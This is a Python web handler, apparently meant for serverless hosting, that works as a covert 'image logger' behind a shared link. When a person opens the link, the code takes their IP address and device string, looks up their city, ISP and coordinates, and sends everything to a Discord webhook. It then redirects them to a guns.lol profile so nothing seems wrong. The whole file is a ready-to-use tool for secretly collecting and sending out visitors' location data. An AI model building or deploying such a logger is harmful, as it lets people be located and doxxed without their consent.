from http.server import BaseHTTPRequestHandler
import requests
import json

# 1. PASTE YOUR WEBHOOK URL INSIDE THE QUOTES
WEBHOOK_URL = "YOUR_ACTUAL_WEBHOOK_URL_HERE"
REDIRECT_URL = "https://guns.lol/sleezyyyyyy"

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        ua = self.headers.get('User-Agent', '')
        ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
        
        # Check if it's Discord bot (for "Link Sent") or a human
        is_bot = any(bot in ua for bot in ["Discordbot", "TelegramBot", "facebookexternalhit"])
        
        # Default data in case the geo-lookup fails
        city, country, isp, coords = "Unknown", "Unknown", "Unknown", "Unknown"
        
        try:
            # Get location data (Coordinates, ISP, etc.)
            geo = requests.get(f"http://ip-api.com/json/{ip}", timeout=4).json()
            if geo.get('status') == 'success':
                city = geo.get('city', 'Unknown')
                country = geo.get('country', 'Unknown')
                isp = geo.get('isp', 'Unknown')
                coords = f"{geo.get('lat', '0')}, {geo.get('lon', '0')}"
        except Exception:
            pass # Keep going even if location fails

        # Set alert title based on bot vs human
        title = "📤 Image Logger - Link Sent" if is_bot else "🎯 New Visitor Located!"
        color = 3447003 if is_bot else 16711680 # Blue for Bot, Red for Human

        payload = {
            "embeds": [{
                "title": title,
                "color": color,
                "fields": [
                    {"name": "🌐 IP Address", "value": f"`{ip}`", "inline": True},
                    {"name": "📍 Location", "value": f"{city}, {country}", "inline": True},
                    {"name": "🏢 Provider/ISP", "value": isp, "inline": False},
                    {"name": "🗺️ Coordinates", "value": coords, "inline": False},
                    {"name": "📱 Device", "value": f"```{ua[:150]}```", "inline": False}
                ],
                "footer": {"text": "Guns.lol Redirect Logger"}
            }]
        }

        # Send to Discord
        try:
            requests.post(WEBHOOK_URL, json=payload, timeout=5)
        except Exception:
            pass

        # Send user to your profile
        self.send_response(302)
        self.send_header('Location', REDIRECT_URL)
        self.end_headers()
